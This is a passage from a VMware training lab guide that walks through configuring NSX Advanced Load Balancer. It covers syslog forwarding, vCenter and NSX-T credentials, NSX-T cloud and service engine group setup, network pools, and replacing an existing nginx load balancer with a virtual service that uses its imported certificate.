<p><img src="https://media.screensteps.com/image_assets/assets/004/135/582/medium/6a9dddf7-9c9f-4093-8586-dffaa5ebfe33.png" alt="" /></p>
<p>Please click <strong>Content Packs</strong> in the top menu in the interface.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/584/medium/797b37b6-e36c-4fc5-95fc-437a4f6c604a.png" alt="" /></p>
<p>You can see that the NSX Advanced Load Balancer Content Pack is already installed.</p>
<p>To make sure we have all the latest versions of the Content Packs, we will check for any updates:</p>
<h4 id="311-optional-check-for-updates"><a class="header" href="#311-optional-check-for-updates">3.1.1. Optional: Check for Updates</a></h4>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/586/medium/9cb43b69-122f-4c18-8ca9-53353dbb06cb.png" alt="" /></p>
<p>Click Update in the navigation pane on the left. If there are any updates available they are listed here. Click UPDATE ALL if there are any updates available.</p>
<h3 id="32-configure-log-forwarding"><a class="header" href="#32-configure-log-forwarding">3.2. Configure Log Forwarding</a></h3>
<p>If you haven't logged in to NSX Advanced Load Balancer already:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/428/126/original/5e47e636-046f-46e1-beaf-add637c0e61c.png" alt="3. NSX Advanced Load Balancer | VCN Livefire 1.0 | TOC | NSX | ScreenSteps - Google Chrome" /></p>
<ul>
<li>Click the bookmark folder <strong>RegionA</strong> and select <strong>Avi Vantage Controller</strong></li>
<li>Use the credentials: admin/VMware1!</li>
</ul>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/909/medium/2a7650f4-1646-4ebb-9520-5253e9278b04.png" alt="" /></p>
<p>We have seen that vRealize Log Insight was prepared. Now we have to configure the forwarding in ALB.</p>
<ol>
<li>From the system menu in the top left corner select <strong>Operations</strong></li>
<li>Click <strong>Notifications</strong></li>
<li>Switch to the <strong>Syslog</strong> tab</li>
<li>Click <strong>CREATE</strong> on the right</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/911/medium/df6c95d6-89c1-4e90-9f25-d831900701ef.png" alt="" /></p>
<ol>
<li>Enter a name for this configuration: <strong>Log Insight</strong></li>
<li>Enter the syslog server name: <strong>log-01a.corp.local</strong></li>
<li>Click <strong>Save</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/913/medium/e7225319-ed40-4663-9918-6c0e9af1f797.png" alt="" /></p>
<p>Next we have to assign the logging profile to the Alert Actions. Still in the Operations section.</p>
<ol>
<li>Select <strong>Alerts</strong> and</li>
<li>Switch to the <strong>Alert Actions</strong> tab</li>
<li>Click the pencil icon for the first entry.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/915/medium/5587b834-18e5-4c7a-8cfc-1132f462bec6.png" alt="" /></p>
<p>Select the entry you created above from the drop-down menu of the <strong>Syslog</strong> section..</p>
<p>Click <strong>Save</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/595/medium/76c89a9f-bb5a-4c30-9a28-a17c5de4057a.png" alt="" /></p>
<p>Repeat the steps above for the <strong>Alert Actions</strong> shown above. If your screen looks similar to the screenshot above your done.</p>
<h2 id="4-user-credentials"><a class="header" href="#4-user-credentials">4. User Credentials</a></h2>
<p>The last thing we need to prepare are the user credentials that the ALB Controller uses to login to vCenter Server and NSX-T Manager.</p>
<blockquote>
<p>For the sake of simplicity, we will simply use the admin accounts of vSphere and NSX-T manager. In a customer scenario you might want to create a custom role in vSphere to follow the principle of least privilege. For more information to setup a role with the appropriate permissions.</p>
<p>In NSX-T you cannot create local users in the current version. You have to rely on external ID sources. If you do not have any configured you can use one of the gustusers in NSX-T or have to use the admin account. The role that you have to assign to a user is Network Engineer.</p>
<p>For more information please check out:<br />
<a href="https://avinetworks.com/docs/20.1/roles-and-permissions-for-vcenter-nsx-t-users/">https://avinetworks.com/docs/20.1/roles-and-permissions-for-vcenter-nsx-t-users/</a></p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/995/medium/974de091-4a06-493f-b381-b8b60f5b3917.png" alt="" /></p>
<ol>
<li>Select <strong>Administration</strong> from the system menu in the top left corner.</li>
<li>Click <strong>User Credentials</strong></li>
<li>Click <strong>CREATE</strong></li>
</ol>
<h3 id="41-nsx-t-credential"><a class="header" href="#41-nsx-t-credential">4.1. NSX-T Credential</a></h3>
<p>First we will create a credential for NSX-T:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/997/original/90549560-d1af-4ccb-994d-fce19ec3ab89.png" alt="" /></p>
<p>Please enter the following information:</p>
<ol>
<li>Name: <strong>NSX Admin</strong></li>
<li>Credentials Type: <strong>NSX-T</strong></li>
<li>Username: <strong>admin</strong></li>
<li>Password: <strong>VMware1!VMware1!</strong></li>
<li>Click <strong>SAVE</strong></li>
</ol>
<p>This will close the configuration dialogue and you will get back to the User Credentials screen.</p>
<h3 id="42-vcenter-server-credential"><a class="header" href="#42-vcenter-server-credential">4.2. vCenter Server Credential</a></h3>
<p>Click <strong>CREATE</strong> again to configure the vCenter credential:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/999/original/dd9a41c1-7262-4a7d-b844-16b98345221a.png" alt="" /></p>
<p>Please enter the following information:</p>
<ol>
<li>Name: <strong>VC Admin</strong></li>
<li>Credentials Type: <strong>vCenter</strong></li>
<li>Username: <strong>administrator@vsphere.local</strong></li>
<li>Password: <strong>VMware1!</strong></li>
<li>Click <strong>SAVE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/282/001/medium/3ff45315-e826-47ae-885e-0a11aa01f6be.png" alt="" /></p>
<p>The two new credentials are now listed in the table.</p>
<blockquote>
<p>We are now ready to setup the NSX-T Cloud.</p>
</blockquote>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="33-setup-nsx-t-cloud"><a class="header" href="#33-setup-nsx-t-cloud">3.3 Setup NSX-T Cloud</a></h1>
<p>Now that we have configured all the prerequisites, it is the time to create our NSX-T Cloud.</p>
<h2 id="1-create-nsx-t-cloud"><a class="header" href="#1-create-nsx-t-cloud">1. Create NSX-T Cloud</a></h2>
<p>Open the management UI of the NSX Advanced Load Balancer</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/282/128/medium/f1a9c5a2-2ffb-4d1d-9e71-ce61a053a085.png" alt="" /></p>
<ol>
<li>Select <strong>Infrastructure</strong> from the system menu in the top left corner.</li>
<li>Click <strong>Clouds</strong></li>
<li>Click <strong>Create</strong> and choose <strong>NSX-T Cloud</strong> from the menu</li>
</ol>
<blockquote>
<p>The Cloud setup is a multi-step process. Please do not rush through the next steps and read the instructions carefully.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/282/134/original/babff791-9fde-47dc-b430-8a5d62ebd4eb.png" alt="" /></p>
<p>Please enter the following information:</p>
<ol>
<li>Name: <strong>nsxmgr-01a</strong></li>
<li>Object Name Prefix: <strong>ALB</strong></li>
</ol>
<p>In the NSX-T section:</p>
<ol>
<li>Enter the NSX-T Manager Address: <strong>nsxmgr-01a.corp.local</strong></li>
<li>Select the NSX-T Manager credentials we created in the step before: <strong>NSX Admin</strong></li>
<li>Click <strong>CONNECT</strong></li>
</ol>
<blockquote>
<p><strong>Object Name Prefix:</strong> This prefix helps us to identify the objects - like groups, routes, etc. - that will be created in NSX-T.</p>
<p>We will take a look at this in a later step!</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/088/937/original/57ac0b32-8b45-4f74-8336-fce22f3dcf54.png" alt="" /></p>
<p>After a successful connection the NSX-T section should look like the one shown above.</p>
<p>Please scroll down to the Transport configuration section.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/282/136/original/33bd235c-6517-4fc5-a362-9d900c9553f3.png" alt="" /></p>
<ol>
<li>Select the overlay TZ: <strong>nsx-overlay-transportzone</strong></li>
<li>For the Management Network Segment:<br />
Tier1 Logical Router ID: <strong>T1-GATEWAY</strong>Segment ID: <strong>OV-LBMGMT</strong></li>
<li>Next add the Data Network Segment(s). Click <strong>ADD</strong></li>
<li>Select from the drop-down:<br />
Logical Router ID: <strong>T1-GATEWAY</strong>Segment: <strong>OV-WEB</strong></li>
<li>Next we have to add the vCenter Sever. Click <strong>ADD</strong> in the vCenter Server section. 
A pop-up windows will appear:</li>
</ol>
<h3 id="11-add-vcenter-server"><a class="header" href="#11-add-vcenter-server">1.1. Add vCenter Server</a></h3>
<p><img src="https://media.screensteps.com/image_assets/assets/004/282/138/original/ca99dec4-d8d1-46e2-9b95-08a9803bd41b.png" alt="" /></p>
<p>Enter the following information:</p>
<ol>
<li>Name: <strong>vcsa-01a</strong></li>
<li>From the drop-down select the vCenter Address: <strong>192.168.110.22</strong></li>
<li>Select <strong>VC Admin</strong> from the credentials list.</li>
<li>Click <strong>CONNECT</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/282/140/original/c3a24fab-9260-4538-b001-0cd5636c4d4f.png" alt="" /></p>
<ol>
<li>After a successful login you can select the Content Library. Choose the one we created in the previous task.</li>
<li>Click <strong>DONE</strong></li>
</ol>
<p>This will close the Add vCenter Server dialogue and will bring you back to the NSX-T Cloud setup:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/282/142/original/b592fc72-fa49-49f7-881e-38d3da2b8c2f.png" alt="" /></p>
<p>Please verify your setup.</p>
<p>Click <strong>SAVE</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/282/144/medium/3c32d831-4ed4-4c8a-a919-ad9c586c0415.png" alt="" /></p>
<p>The new configured cloud shows up now in the list.</p>
<p>It might take a while to see the green signal in the row of the NSX-T Cloud.</p>
<h2 id="2-nsx-t-cloud-customization"><a class="header" href="#2-nsx-t-cloud-customization">2. NSX-T Cloud Customization</a></h2>
<p>We have created our NSX-T Cloud and the ALB controller has imported inventory information from vCenter and NSX-T Manager.</p>
<p>Next we want to fine-tune some parameters.</p>
<h3 id="21-service-engine-groups"><a class="header" href="#21-service-engine-groups">2.1. Service Engine Groups</a></h3>
<p>In NSX Advanced Load Balancer SE are not managed as a single entity. They are managed as a group - so let us take a look on the settings and parameters we can find in a SE Group.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/483/medium/2d52083e-132d-4467-a047-6159f6f3fb1b.png" alt="" /></p>
<ol>
<li>Make sure you are still in the <strong>Infrastructure</strong> configuration scope.</li>
<li>Click <strong>Service Engine</strong></li>
<li>Select the newly created NSX-T cloud: <strong>nsxmgr-01a</strong></li>
</ol>
<p>This view will list later all the SEs that belong to the selected cloud. Although we have created the NSX-T Cloud, there are no SE deployed yet. This will happen when we create the first virtual service.</p>
<p>But lets move on to the Service Engine Group</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/485/medium/3c322e1e-d30b-4166-aa04-ab9287f4836f.png" alt="" /></p>
<ol>
<li>Click <strong>Service Engine Group</strong> in top menu bar.</li>
<li>Select the NSX-T cloud: <strong>nsxmgr-01a</strong></li>
<li>A <strong>Default-Group</strong> that can be tweaked to our needs has been created during the cloud setup process.</li>
<li>Click the pencil icon on the right to edit the group.</li>
</ol>
<h4 id="211-basic-settings"><a class="header" href="#211-basic-settings">2.1.1. Basic Settings</a></h4>
<blockquote>
<p>Available settings and parameters within a SE Group depend heavily on the type of Cloud it belongs to. So you will find different settings when you are working with a vCenter or NSX-T cloud compared to a AWS or other public cloud offerings.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/487/medium/c33851e8-b91b-414a-9b79-b74583dfc5af.png" alt="" /></p>
<p>On the upper half of the Basic Settings screen we can find:</p>
<ol>
<li>The parameters that define the <strong>High Availability Mode</strong>.<br />
Note: Changing the HA Mode will also change the <strong>VS Placement across SEs</strong> options on the right. 
For out training we will use the default values.</li>
<li>We can use the resource parameters to change the size of the SEs virtual machines that will be deployed in our environment.</li>
<li>For our lab environment we will disable <strong>Memory Reserve</strong>. 
Please leave this checkbox enabled for production environments or PoCs.</li>
</ol>
<blockquote>
<p>Please feel free to explore the other parameters on this page. Just place your mouse over the question mark to the parameters to get a short help.</p>
<p>To learn more about SE Group settings, check out:<br />
<a href="https://avinetworks.com/docs/20.1/service-engine-group/">https://avinetworks.com/docs/20.1/service-engine-group/</a></p>
</blockquote>
<h4 id="212-advanced-settings"><a class="header" href="#212-advanced-settings">2.1.2. Advanced Settings</a></h4>
<p>Next lets switch tot the Advanced tab.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/489/medium/a96ca8c8-4a18-4d6e-8167-9e3981afa67f.png" alt="" /></p>
<ol>
<li>Please click the <strong>Advanced</strong> tab on the top of the screen.</li>
<li>Change the Service Engine Name Prefix to <strong>DefaultGroup</strong></li>
<li>The section <strong>Advanced HA &amp; Placement</strong> allows us to fine-tune the HA modes configured on the Basic Settings screen. 
In our case we will use the default values: We will have 1 Buffer SE and the minimum scale per VS will be 1.</li>
<li>The <strong>Placement Scope</strong> enables administrators to fine-tune SE placement for the environment. 
If you want to discover this feature check out the following Information Only section.</li>
<li>Click <strong>Save</strong></li>
</ol>
<h4 id="2121-information-only-placement-scope"><a class="header" href="#2121-information-only-placement-scope">2.1.2.1. Information Only: Placement Scope</a></h4>
<blockquote>
<p>The intention of this section is to demonstrate the SE placement options for an SE group in an NSX-T Cloud.</p>
<p>It is a good idea to save the settings you made and re-open the configuration dialogue to play around with it.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/491/medium/a88d6bc4-ebd8-4bb4-b12d-4fca3bd6cdc5.png" alt="" /></p>
<p>First click <strong>Add vCenter</strong></p>
<p>Remember: An NSX-T manager can be connected to several vCenter Servers. In this section you can configure where the SEs are actually created.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/493/medium/e62c90e2-3b63-482a-bd01-592f325beb0d.png" alt="" /></p>
<ol>
<li>We have only one <strong>vCenter Server</strong>. Please select it from the drop-down menu.</li>
<li>You can select an existing VM Folder to store your SEs to. If you do not select an existing one, a new folder <strong>AviSeFolder</strong> will be created.</li>
<li>The  <strong>Host Scope</strong> allows you to explicitly include or exclude specific hosts for SE placement.</li>
<li>Similar to the Host Scope the same can be done for <strong>Data Stores</strong> as well.</li>
<li>When your done with the examination of the Placement Scope, please click the <strong>Recycle Bin</strong> icon on the right to delete any settings.</li>
</ol>
<p>This concludes this short Information Only section.</p>
<h3 id="22-networks"><a class="header" href="#22-networks">2.2. Networks</a></h3>
<p>Next we have to setup the Networks for SE management and the service VIPs.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/504/medium/9199f27a-d8e2-4f0e-a25c-44379413f7ad.png" alt="" /></p>
<ol>
<li>Select <strong>Infrastructure</strong> from the system menu in the top left corner.</li>
<li>Click <strong>Networks</strong></li>
<li>Select the NSX-T Cloud: <strong>nsxmgr-01a</strong></li>
<li>We can see that the two overlay networks we defined during cloud setup are listed in the table.</li>
<li>Please click the pencil icon on the right for the <strong>OV-LBMGT</strong> network to open the configuration dialogue.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/745/medium/8c9e3c2e-62e7-409a-82af-90ee7b7c62eb.png" alt="" /></p>
<p>This logical segment will be used for SE management.</p>
<p>Click <strong>Add Subnet</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/506/medium/8f505e3e-ab0e-4224-95d5-f827a6ee9f53.png" alt="" /></p>
<ol>
<li>Enter the <strong>IP Subnet</strong>: 172.16.100.0/24</li>
<li>Click <strong>Add Static IP Address Pool</strong> and then</li>
<li>enter the range: <strong>172.16.100.100-172.16.100.120</strong></li>
<li>Click <strong>Save</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/508/medium/10a0bd40-0cc3-48d8-952e-f1a131376834.png" alt="" /></p>
<ol>
<li>The configured range shows up in the <strong>Network IP Subnets</strong> section.</li>
<li>Click <strong>Save</strong> twice</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/510/medium/7cd36693-b9d6-43ca-aeec-6de7e57a7233.png" alt="" /></p>
<ol>
<li>Network configuration details can be easily viewed by using the <strong>+/-</strong> icons on the right.</li>
<li>Next we have add subnet information to the <strong>OV-WEB</strong> network as well. Please click the pencil icon.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/512/medium/21c33d7c-2cb8-42b2-8019-cf28acdc6b7b.png" alt="" /></p>
<ol>
<li>Enter the <strong>IP Subnet</strong>: 172.16.10.0/24</li>
<li>Click <strong>Add Static IP Address Pool</strong> and then</li>
<li>enter the range: <strong>172.16.10.100-172.16.10.120</strong></li>
<li>Click <strong>Save</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/514/medium/cb4685fd-8c70-4f6e-b6dc-0501568a18db.png" alt="" /></p>
<ol>
<li>The configured range shows up in the <strong>Network IP Subnets</strong> section.</li>
<li>Click <strong>Save</strong> twice</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/516/medium/64837233-3db5-436c-80d7-6443056ed6d3.png" alt="" /></p>
<p>Networks configured!</p>
<blockquote>
<p>Now we are ready to deploy the first Virtual Service!</p>
</blockquote>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="34-replace-existing-load-balancer"><a class="header" href="#34-replace-existing-load-balancer">3.4 Replace existing Load Balancer</a></h1>
<blockquote>
<p>In this module we will replace the existing LB solution and deploy the first Virtual Service. We will also see how the integration works and which objects will be created in vSphere and NSX-T.</p>
</blockquote>
<h2 id="1-check-existing-solution"><a class="header" href="#1-check-existing-solution">1. Check Existing Solution</a></h2>
<p>Before we create the virtual service in ALB, we need to check out the existing solution.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/600/medium/e1cbe995-5615-4838-822c-25425521c0bd.png" alt="" /></p>
<p>Clicking on the bookmark <strong>3-Tiers-WebApp</strong> in your browser will point to an address: <a href="https://webapp.corp.local/cgi-bin/app.py">https://webapp.corp.local/cgi-bin/app.py</a></p>
<p>Repetitive clicks on the bookmark will reveal that the LB will alternate between <strong>172.16.10.11</strong> and <strong>172.16.10.12</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/139/399/medium/33770078-6ca9-42b3-9159-b2b1196f0b25.png" alt="" /></p>
<p>Looking at the inventory in vCenter Server, we can identify the load balancer VM <strong>lb-01a</strong> with the IP address <strong>172.16.10.10.</strong> The DNS entry <strong>webapp.corp.local</strong> will point to this IP.</p>
<h2 id="2-replacement-process"><a class="header" href="#2-replacement-process">2. Replacement Process</a></h2>
<h3 id="21-import-the-certificates"><a class="header" href="#21-import-the-certificates">2.1. Import the Certificates</a></h3>
<p>Remember: the customer insisted on using the existing certificates and using the same IP for the ALB based service.</p>
<p>So we have to first import the certificates. We can find them in the /etc/nginx/ssl directory of lb-01a.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/602/medium/25f83f9b-7f03-4152-ac14-0948bb929c6b.png" alt="" /></p>
<p>Please open a Command Prompt on your controlcenter VM.</p>
<ol>
<li>To make sure we can easily find the downloaded files, change to the directory Downloads: <code>cd Downloads</code></li>
<li>Initiate the download using: <code>scp root@172.16.10.10:/etc/nginx/ssl/webapp.* .</code> Use password: VMware1!</li>
<li>Three files should be downloaded. We can ignore the .conf file, but we are intersted in the .key and the .pem file.</li>
</ol>
<p>Please re-open the tab pointing to the ALB management UI.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/604/medium/a387013c-0794-4f42-aaae-1afddc9fbe68.png" alt="" /></p>
<ol>
<li>Switch to the <strong>Templates</strong> scope using the system menu in the top left corner.</li>
<li>Click <strong>Security</strong></li>
<li>Make sure you are viewing the <strong>SSL/TLS Certificates</strong> tab</li>
<li>Click <strong>CREATE</strong> and select <strong>Application Certificate</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/606/original/58971142-272e-4610-90e5-8ad4d822e936.png" alt="" /></p>
<ol>
<li>Enter a name for the certificate: <strong>webapp.corp.local</strong></li>
<li>Type: <strong>Import</strong></li>
<li>In the Certificate row select <strong>Upload File</strong> and click on the button below</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/608/medium/5f994848-b21b-4f26-bfc4-c2cc337cc5de.png" alt="" /></p>
<ol>
<li>Point the file manager to the Downloads directory and select: <strong>webapp.pem</strong></li>
<li>Click <strong>Open</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/610/original/9ee60ef4-b75c-4402-b54a-f94859d863c2.png" alt="" /></p>
<ol>
<li>Repeat the step above for the Key file in the next row. Upload the file <strong>webapp.key</strong></li>
<li>Then click <strong>Validate</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/139/409/original/fa902029-b814-42dc-8d81-1a7b807424f1.png" alt="" /></p>
<p>The content of the certificate files is now shown in the UI.</p>
<p>Click <strong>Save</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/612/medium/ebd42d3a-bfa3-4502-8ab4-db97daa407ba.png" alt="" /></p>
<p>The certificate along some information about it should appear now in the list of certificates.</p>
<p>Now we are ready to create the Virtual Service!</p>
<h3 id="22-create-virtual-service"><a class="header" href="#22-create-virtual-service">2.2. Create Virtual Service</a></h3>
<blockquote>
<p>The VS setup is a multi-step process. Please do not rush through the next steps and read the instructions carefully.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/825/medium/5286e055-1f71-44b9-b020-dbaeefb67418.png" alt="" /></p>
<ol>
<li>Select <strong>Applications</strong> from the systems menu.</li>
<li>Click <strong>Dashboard</strong></li>
<li>Click <strong>CREATE VIRTUAL SERVICE</strong> and choose <strong>Advanced Setup</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/827/medium/996571ff-ee85-4fa5-9f59-7522a9f335ce.png" alt="" /></p>
<ol>
<li>Select the NSX-T Cloud: <strong>nsxmgr-01</strong></li>
<li>Click <strong>Next</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/829/medium/b30edaff-9241-43ea-8db3-5f650c43cb47.png" alt="" /></p>
<ol>
<li>Name: <strong>webapp.corp.local</strong></li>
<li>Enter the FQDN: <strong>webapp.corp.local</strong> - you will notice that the field below will be automatically populated with the IP.</li>
<li>Select the Application Profile: <strong>System-Secure-HTTP</strong></li>
</ol>
<p>Please scroll down to the bottom of the page.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/831/medium/b5d0e74d-1ca9-484d-8310-1ff6e91c5fc6.png" alt="" /></p>
<ol>
<li>To tell the ALB which routing context we are using we have to select the Tier1 Logical Router: <strong>T1-GATEWAY</strong></li>
<li>Set the Service Port to: **443<br />
**and make sure you have enabled <strong>SSL</strong></li>
<li>Please open the drop-down menu of the <strong>SSL Certificates</strong> field and</li>
<li>select the previous imported certificate: <strong>webapp.corp.local</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/833/medium/cba3cd44-a553-4979-9f14-59b4d185ecbd.png" alt="" /></p>
<ol>
<li>Please remove the <strong>System-Default-Cert</strong> form the list of SSL Certificates by clicking the X as indicated in the screenshot.</li>
<li>Click the drop-down menu in the <strong>Pool</strong> field</li>
<li>and select <strong>Create Pool</strong></li>
</ol>
<h4 id="221-create-server-pool"><a class="header" href="#221-create-server-pool">2.2.1. Create Server Pool</a></h4>
<blockquote>
<p>This will open the Pool setup wizard.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/835/medium/4fe7c545-04b5-4f83-a563-ca3ef3bc75cc.png" alt="" /></p>
<ol>
<li>The system will put in a name based on the VS name. This will work for us</li>
<li>Default Service Port: <strong>443</strong></li>
<li>Set the Load Balance algorithm to: <strong>Round Robin</strong></li>
<li>Tier1 Logical Router: <strong>T1-GATEWAY</strong></li>
<li>Add an Active Monitor: <strong>System-HTTPS</strong></li>
</ol>
<p>Please scroll down.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/837/medium/c8c279ae-e3b3-4e0e-bf05-2150aece56b7.png" alt="" /></p>
<ol>
<li>Please <strong>Enable SSL</strong></li>
<li>Select SSL Profile: <strong>System-Standard</strong></li>
<li>Click <strong>Next</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/839/medium/5fc30755-b549-420e-af74-da7f088ebc0f.png" alt="" /></p>
<p>Next we have to define the server pool members. The ALB reads the inventory of NSX-T manager and also the Security Groups defined - the Group WEB contains both the web servers of the WebApp.</p>
<ol>
<li>Please select <strong>Security Groups</strong></li>
<li>Choose NSX Security Group <strong>WEB</strong></li>
<li>Click <strong>Next</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/428/234/medium/4daaea7b-a8b7-42b4-8213-c465b956f26f.png" alt="" /></p>
<p>No need to change any values here. Click <strong>Next</strong>.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/428/236/medium/23665fcd-d6a7-4cbc-8c7c-a03b031de1cf.png" alt="" /></p>
<p>Click <strong>Save</strong>.</p>
<p>Pool created! Back on the Virtual Service configuration screen:</p>
<blockquote>
<p>This concludes the Pools setup wizard and will bring us back to the VS configuration dialogue.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/922/medium/ffeac45d-fcb7-466d-9786-3b73c3934052.png" alt="" /></p>
<ol>
<li>Please set the SSL Profile for the VS to: <strong>System-Standard</strong></li>
<li>Verify that the new pool is shown in the Pool field</li>
<li>and that there is only the <strong>webapp.corp.local</strong> certificate listed in the SSL Certificate field</li>
<li>Click <strong>Next</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/849/medium/0aac9128-e7e3-4945-8007-104436b4bae3.png" alt="" /></p>
<p>We will leave the <strong>Policies</strong> tab empty for now. You will create some policies in Optimization &amp; Operations lab.</p>
<p>Click <strong>Next</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/851/medium/839cae84-45ed-480e-9e3c-b81131079ece.png" alt="" /></p>
<p>For our lab we want to make sure to log everything.</p>
<ol>
<li>Activate: <strong>Log all headers</strong></li>
<li>Enable: <strong>Non-significant logs</strong></li>
<li>Set the Non-significant log duration to: **0<br />
**0 will set it to indefinitely. Please do not use this setting in production environments!</li>
<li>Click <strong>Next</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/139/425/medium/71358725-55d8-44f3-9e5b-a258ce5df552.png" alt="" /></p>
<p>No need to change anything on the Advances screen. Just click <strong>Save</strong></p>
<h3 id="23-virtual-service-deployment-in-progress"><a class="header" href="#23-virtual-service-deployment-in-progress">2.3. Virtual Service Deployment in Progress</a></h3>
<blockquote>
<p>Now that we have configured the fist VS the SE deployment is triggered.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/969/medium/eb86215c-4416-45d6-9599-6f423ce4d3ee.png" alt="" /></p>
<p>Your screen should look similar to the one above. If not: Open the Virtual Services tab in the Application section and click the webapp.corp.local.</p>
<p>First you will notice the red exclamation mark in the top right corner. Please place your mouse over it then a message box appears indicating that the SE deployment is in progress.</p>
<p>This will take some time, in the meantime we want to explore what happens behind the scenes.</p>
<h3 id="24-what-happens-in-vsphere"><a class="header" href="#24-what-happens-in-vsphere">2.4. What happens in vSphere?</a></h3>
<p>Please open the browser tab pointing to vCenter Server.</p>
<h4 id="241-shutdown-existing-load-balancer"><a class="header" href="#241-shutdown-existing-load-balancer">2.4.1. Shutdown Existing Load Balancer</a></h4>
<p>Lets shut down the old load balancer VM.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/853/medium/9cdd9414-35d1-49f0-8e6e-c0fced7a942f.png" alt="" /></p>
<ol>
<li>In the <strong>Host &amp; Cluster</strong> View</li>
<li>Look for the <strong>lb-01a</strong> virtual machine</li>
<li>and <strong>shut it down</strong>.</li>
</ol>
<h4 id="242-service-engine-vms-being-deployed"><a class="header" href="#242-service-engine-vms-being-deployed">2.4.2. Service Engine VMs being deployed</a></h4>
<p>The SEs are still being deployed....</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/855/medium/114851ca-cb8d-49d5-8ecd-6b53188dca42.png" alt="" /></p>
<p>You can see two powered down VMs in the vCenter's inventory.</p>
<blockquote>
<p>Note: the last five letters in the SE name might be different in your environment. These are random generated names!</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/139/431/original/d07ef1c8-c1d0-403d-8fff-7dd3cbb22bdb.png" alt="" /></p>
<p>After a few minutes the SE VMs should be shown as powered on. <strong>This might take some time - what about a coffee?</strong></p>
<blockquote>
<p>Can you explain how the SE names have been generated?</p>
<ul>
<li>We set the ALB prefix during NSX-T Cloud Setup and</li>
<li>DefaultGroup was set in the SE Group profile</li>
</ul>
</blockquote>
<h5 id="2421-content-library"><a class="header" href="#2421-content-library">2.4.2.1. Content Library</a></h5>
<p>Lets check out the Content Library.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/925/original/35368321-b5ec-40b1-b306-b889e6bae811.png" alt="" /></p>
<ol>
<li>Click <strong>Menu</strong></li>
<li>Click <strong>Content Library</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/927/medium/744e95ed-8543-4cd3-bddc-b76c8a5cf704.png" alt="" /></p>
<p>After clicking the <strong>NSX Advanced Loadbalancer</strong> library you will the ALB uploaded an OVA to vCenter Server.</p>
<p>Please note: the version number in your pod might be different.</p>
<h3 id="25-objects-created-in-nsx-t"><a class="header" href="#25-objects-created-in-nsx-t">2.5. Objects Created in NSX-T</a></h3>
<p>Now lets take a look on all the objects that have been created by the Advanced Load Balancer.</p>
<p>Please open the tab pointing to the NSX-T Manager UI.</p>
<h4 id="251-groups"><a class="header" href="#251-groups">2.5.1. Groups</a></h4>
